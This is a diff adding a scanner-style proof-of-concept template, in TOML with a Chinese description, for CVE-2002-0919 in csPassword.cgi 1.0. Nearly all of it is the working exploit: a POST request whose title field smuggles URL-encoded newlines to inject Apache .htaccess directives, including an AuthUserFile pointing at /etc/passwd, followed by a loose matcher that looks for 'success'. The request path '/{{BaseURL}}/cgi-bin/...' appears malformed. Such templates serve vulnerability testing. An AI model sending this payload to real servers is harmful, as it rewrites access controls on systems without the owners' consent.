@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "通过向 csPassword.cgi 编辑页面的标题字段注入换行符，绕过输入限制修改服务器上的 .htaccess 文件，获取对敏感资源的未授权访问。该漏洞影响 csPassword.cgi 1.0 版本，攻击者需拥有普通用户权限。"
+id = "POC-AVE-2002-0473"
+name = "CGIScript.net csPassword.cgi 1.0 HTAccess 文件泄漏漏洞 PoC"
+severity = "high"
+tags = ["ave-2002-0473"]
+vuln_id = [
+    "CVE-2002-0919",
+    "AVE-2002-0473",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/csPassword.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=edit&title=malicious%0aAuthType%20Basic%0aAuthName%20%22Restricted%22%0aAuthUserFile%20%2fetc%2fpasswd%0aRequire%20valid-user&password=test&confirm=test"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Password file updated",
+    "success",
+]
